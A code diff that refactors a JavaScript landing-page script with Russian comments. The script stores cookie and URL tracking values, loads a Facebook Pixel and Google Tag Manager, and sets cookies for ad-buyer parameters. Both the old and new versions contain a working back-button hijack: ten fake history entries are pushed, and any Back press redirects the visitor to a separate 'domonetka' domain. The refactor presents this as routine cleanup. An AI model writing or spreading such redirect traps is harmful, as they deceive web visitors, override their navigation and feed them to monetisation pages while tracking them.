@@ -1,32 +1,32 @@
 (function () {
+    // Вспомогательная функция для получения значения cookie
     function getCookie(name) {
-        const value = `; ${document.cookie}`;
-        const parts = value.split(`; ${name}=`);
-        if (parts.length === 2) return parts.pop().split(';').shift();
+        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+        return match ? match[2] : null;
     }
 
+    // Получаем URL-параметры один раз
     const urlParams = new URLSearchParams(window.location.search);
     const pxl = urlParams.get('pxl') || 'default_pxl';
     const contentIds = urlParams.get('content_ids');
     const subid = getCookie('_subid');
 
-    if (pxl) {
-        sessionStorage.setItem('pxl', pxl);
+    // Вспомогательная функция для записи в sessionStorage, если значение существует
+    const setSessionItem = (key, value) => {
+        if (value) sessionStorage.setItem(key, value);
+    };
+
+    setSessionItem('pxl', pxl);
+    setSessionItem('external_id', subid);
+    setSessionItem('event_id', subid);
+    setSessionItem('content_ids', contentIds);
+
+    // Проверяем, что переменная domonetka определена и не пустая
+    if (typeof domonetka !== 'undefined' && domonetka) {
+        setSessionItem('dom', domonetka);
     }
 
-    if (subid) {
-        sessionStorage.setItem('external_id', subid);
-        sessionStorage.setItem('event_id', subid);
-    }
-
-    if (domonetka) {
-        sessionStorage.setItem('dom', domonetka);
-    }
-
-    if (contentIds) {
-        sessionStorage.setItem('content_ids', contentIds);
-    }
-
+    // Инициализация Facebook Pixel, если указан pxl
     if (pxl) {
         !function (f, b, e, v, n, t, s) {
             if (f.fbq) return;
@@ -35,11 +35,11 @@
             };
             if (!f._fbq) f._fbq = n;
             n.push = n;
-            n.loaded = !0;
+            n.loaded = true;
             n.version = '2.0';
             n.queue = [];
             t = b.createElement(e);
-            t.async = !0;
+            t.async = true;
             t.src = v;
             s = b.getElementsByTagName(e)[0];
             s.parentNode.insertBefore(t, s);
@@ -54,55 +54,47 @@
         }
     }
 
-    if (domonetka && domonetka.trim() !== '' && domonetka !== '{domonetka}') {
-        (async function () {
-            try {
-                onpopstate = function (event) {
-                    if (event.state) {
-                        const newUrl = `${domonetka}?pxl=${pxl}`;
-                        location.replace(newUrl);
-                    }
-                };
-
-                for (let i = 0; i < 10; i++) {
-                    setTimeout(function () {
-                        history.pushState({}, "");
-                    }, i * 50);
+    // Обработка переходов для domonetka
+    if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && domonetka !== '{domonetka}') {
+        try {
+            window.onpopstate = function (event) {
+                if (event.state) {
+                    const newUrl = `${domonetka}?pxl=${pxl}`;
+                    location.replace(newUrl);
                 }
-            } catch (error) {
-                console.log(error);
+            };
+
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => history.pushState({}, ""), i * 50);
             }
-        })();
+        } catch (error) {
+            console.error(error);
+        }
     }
-})();
 
-(function() {
-  function setUTMCookies() {
-    const utmParameters = ['gt', 'pt', 'ad_id', 'acc', 'buyer'];
-    const params = new URLSearchParams(window.location.search);
-    utmParameters.forEach(param => {
-      if (params.has(param)) {
-        const value = params.get(param);
-        document.cookie = `${param}=${encodeURIComponent(value)}; path=/; max-age=3600`;
-      }
-    });
-  }
-
-  setUTMCookies();
-
-  const params = new URLSearchParams(window.location.search);
-  if (params.has('gt')) {
-    const gt = params.get('gt');
-    const gtmScript = document.createElement('script');
-    gtmScript.async = true;
-    gtmScript.src = `https://www.googletagmanager.com/gtag/js?id=${gt}`;
-    document.head.appendChild(gtmScript);
-    window.dataLayer = window.dataLayer || [];
-    function gtag() {
-      window.dataLayer.push(arguments);
+    // Установка UTMCookies и интеграция Google Tag Manager
+    function setUTMCookies() {
+        const utmParameters = ['gt', 'pt', 'ad_id', 'acc', 'buyer'];
+        utmParameters.forEach(param => {
+            if (urlParams.has(param)) {
+                const value = urlParams.get(param);
+                document.cookie = `${param}=${encodeURIComponent(value)}; path=/; max-age=3600`;
+            }
+        });
     }
-    window.gtag = gtag;
-    gtag('js', new Date());
-    gtag('config', gt);
-  }
+    setUTMCookies();
+
+    if (urlParams.has('gt')) {
+        const gt = urlParams.get('gt');
+        const gtmScript = document.createElement('script');
+        gtmScript.async = true;
+        gtmScript.src = `https://www.googletagmanager.com/gtag/js?id=${gt}`;
+        document.head.appendChild(gtmScript);
+        window.dataLayer = window.dataLayer || [];
+        window.gtag = function () {
+            window.dataLayer.push(arguments);
+        };
+        gtag('js', new Date());
+        gtag('config', gt);
+    }
 })();
